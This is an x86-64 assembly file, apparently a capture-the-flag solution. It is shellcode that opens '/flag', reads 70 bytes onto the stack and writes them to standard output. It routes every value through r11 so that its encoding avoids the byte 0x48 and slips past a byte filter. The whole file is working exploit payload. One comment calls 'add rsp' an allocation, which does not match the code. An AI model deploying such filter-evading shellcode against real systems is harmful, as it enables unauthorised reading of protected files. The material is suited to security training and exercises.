.intel_syntax noprefix



.section .text

    # passing all values thought r11, op encoding does not contain 0x48

    mov r11, 0x67616c662f
    push r11

    mov r11, rsp
    mov rdi, r11            # address of /flag
    mov r11, 0
    mov rsi, r11
    mov rdx, r11
    mov r11, 2
    mov rax, r11             # open file
    syscall                 

    # reading flag
    mov r11, rax
    mov rdi, r11
    mov r11, 70
    add rsp, r11             # allocating space to stack -> 70 byte
    mov rdx, r11
    mov r11, rsp
    mov rsi, r11            # rsi = buffer on stack address
    mov r11, 0
    mov rax, r11
    syscall

    mov r11, 1
    mov rdi, r11
    mov r11, rsp
    mov rsi, r11
    mov r11, 70
    mov rdx, r11
    mov r11, 1
    mov rax, r11
    syscall
